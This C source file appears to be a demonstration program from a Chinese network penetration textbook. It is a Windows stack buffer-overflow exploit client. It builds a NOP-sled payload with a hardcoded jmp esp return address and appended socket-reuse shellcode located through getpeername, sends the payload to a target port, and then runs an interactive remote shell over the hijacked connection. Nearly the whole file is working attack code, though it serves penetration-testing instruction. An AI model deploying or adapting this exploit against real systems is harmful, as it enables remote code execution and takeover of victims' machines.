/* client_getpeername.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  getpeername查找socket的shellcode演示
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#pragma comment (lib,"ws2_32")

// jmp esp address of chinese version
#define JUMPESP "\x12\x45\xfa\x7f"

#include "shellcode_getpeername.c"

// ripped from isno
int Make_Connection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    SOCKET s;
    int i;
    DWORD bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        closesocket(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctlsocket(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        closesocket(s);
        return -3;
    }
    if(i==0)
    {
        closesocket(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        closesocket(s);
        return -5;
    }
    ioctlsocket(s,FIONBIO,&bf);
    return s;
}

/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
    int     l;
    char    buf[512];
    struct    timeval time;
    unsigned long    ul[2];

    time.tv_sec = 1;
    time.tv_usec = 0;

    while (1) 
    {
        ul[0] = 1;
        ul[1] = sock;

        l = select (0, (fd_set *)&ul, NULL, NULL, &time);
        if(l==1)
        {
            l = recv (sock, buf, sizeof (buf), 0);
            if (l <= 0) 
            {
                printf ("[-] Connection closed.\n");
                return;
            }
            l = write (1, buf, l);
            if (l <= 0) 
            {
                printf ("[-] Connection closed.\n");
                return;
            }
        }
        else
        {
            l = read (0, buf, sizeof (buf));
            if (l <= 0) 
            {
                printf("[-] Connection closed.\n");
                return;
            }
            l = send(sock, buf, l, 0);
            if (l <= 0) 
            {
                printf("[-] Connection closed.\n");
                return;
            }
        }
    }
}

int main()
{
    SOCKET  c,s;
    WSADATA WSAData;
    char Buff[1024];
    unsigned short port;
    struct sockaddr_in sa;
    int salen = sizeof(sa);

    if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
    {
        printf("[-] WSAStartup failed.\n");
        WSACleanup();
        exit(1);
    }
    
    GetShellCode();
    if (!sh_Len)
    {
        printf("[-] Shellcode generate error.\n");
        exit(1);
    }

    s = Make_Connection("127.0.0.1", 4444, 10);
    if(s<0)
    {
        printf("[-] connect error.\n");
        exit(1);
    }
    
    // get local port
    getsockname(s, (struct sockaddr FAR *)&sa, &salen);
    
    Enc_key += Enc_key << 8;
    port = sa.sin_port^Enc_key;
    printf("port = %x %x\n", sa.sin_port, port);

    //memcpy(&sh_Buff[sh_Len], &port, 2);
    memcpy(&sh_Buff[sh_Len], &sa.sin_port, 2);

    sh_Buff[sh_Len+2] = 0;

    memset(Buff, 0x90, sizeof(Buff)-1);

    strcpy(Buff+56, JUMPESP);
    strcpy(Buff+60, sh_Buff);

    send(s,Buff,sizeof(Buff),0);
    Sleep(1000);

    shell(s);
    
    WSACleanup();
    return 1;
}